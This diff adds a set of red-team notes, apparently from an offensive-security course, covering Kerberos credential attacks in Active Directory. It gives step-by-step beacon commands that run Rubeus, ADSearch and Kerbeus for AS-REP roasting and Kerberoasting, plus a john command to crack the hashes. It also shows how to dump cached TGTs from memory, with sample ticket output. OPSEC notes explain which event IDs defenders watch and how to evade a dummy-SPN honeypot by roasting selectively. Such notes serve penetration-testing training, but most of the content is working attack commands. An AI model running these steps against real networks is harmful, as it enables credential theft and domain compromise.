@@ -1,0 +1,88 @@
+#AS-REP Roasting
+
+Rubeus' asreproast command will enumerate every account that has preauthentication disabled, sends an AS-REQ for them, then carves out the encrypted part:
+
+Steps:1
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
+
+Steps:2
+kali@kali# john --wordlists=../../rockyou.txt hash.txt
+
+OPSEC:
+Most detection strategies are geared towards looking at unusual or anomalous ticket requests. Each AS-REP generates a 4768 event, so a single user sending multiple AS-REQs in a short timeframe should be investigated. Rubeus also requests RC4-encrypted tickets by default because they are easier to crack. However, since modern versions of Windows uses AES128 and 256, the use of RC4 tickets can stand out.
+
+#Kerberoasting for SPN User Account:
+
+Rubeus' kerberoast command will enumerate and roast every non-default service.
+
+Steps:1
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
+
+Steps:2
+These hashes can be cracked using hashcat's 13100 hash mode.
+
+But before that:
+OPSEC
+Each TGS-REP generates a 4769 event, so a single user requesting multiple tickets in a short timeframe should be investigated. As with AS-REP Roasting, Rubeus requests service tickets using RC4 encryption by default.
+
+Another effective strategy is to create one or more dummy SPNs that are not backed by a legitimate service, in which case, a TGS-REQ/REP should never be generated for them. Since most tools automatically enumerate and roast every account in a domain with an SPN set, a careless adversary can trigger this high-fidelity alert.
+
+A safer approach is to use an enumeration tool to triage potential targets first, then roast them more selectively.
+
+Steps:1
+
+beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
+
+Steps:2
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /spn:MSSQLSvc/lon-sql-1.contoso.com:1433 /simple /nowrap
+
+Extracting Tickets:
+If an adversary gains elevated access to a computer, they can extract Kerberos tickets that are currently cached in memory. Rubeus' triage command will enumerate every logon session present and their associated tickets. If multiple logon session exist (i.e. multiple users are logged onto the same computer), TGTs and/or service tickets for those users can be extracted and re-used by the adversary.
+
+Steps:1
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+
+Steps:2
+Rubeus' dump command with no additional parameters will extract every single ticket. Use the /service and/or /luid parameters to target a specific service and/or logon session. Tickets with krbtgt as the service are TGTs, other tickets are service tickets.
+
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80 /service:krbtgt /nowrap
+
+BOF's:
+RalfHacker has a number of Kerberos BOFs that are useful for instances where you don't want to use Rubeus with execute-assembly. The included Aggressor scripts adds a few new Beacon commands, such as krb_triage and krb_dump.
+
+beacon> krb_triage
+[+] Kerbeus TRIAGE by RalfHacker
+
+Action: List Kerberos Tickets (All Users)
+
+| LUID | Client | Service | End Time |
+| 0:0x2c25f4 | rsteel @ CONTOSO.COM | krbtgt/CONTOSO.COM | 31.01.2026 02:37:03 |
+beacon> krb_dump /user:rsteel /service:krbtgt
+[+] Kerbeus DUMP by RalfHacker
+
+Action: List Kerberos Tickets for 'rsteel'
+
+[] Target service : krbtgt
+[] Target user : rsteel
+
+UserName : rsteel
+Domain : CONTOSO
+LogonId : 0:0x2c25f4
+Session : 0
+UserSID : S-1-5-21-3926355307-1661546229-813047887-1108
+Authentication package : Negotiate
+LogonServer : LON-DC-1
+UserPrincipalName : rsteel@contoso.com
+
+[*] Cached tickets: (1)
+
+[0]
+ClientName : rsteel @ CONTOSO.COM
+ServiceRealm : krbtgt/CONTOSO.COM @ CONTOSO.COM
+StartTime (UTC) : 30.01.2026 16:36:13
+EndTime (UTC) : 31.01.2026 02:36:13
+RenewTill (UTC) : 06.02.2026 16:36:13
+Flags : forwardable renewable initial pre_authent enc_pa_rep
+KeyType : aes256_cts_hmac_sha1
+
+doIFq[...snip...]uQ09N
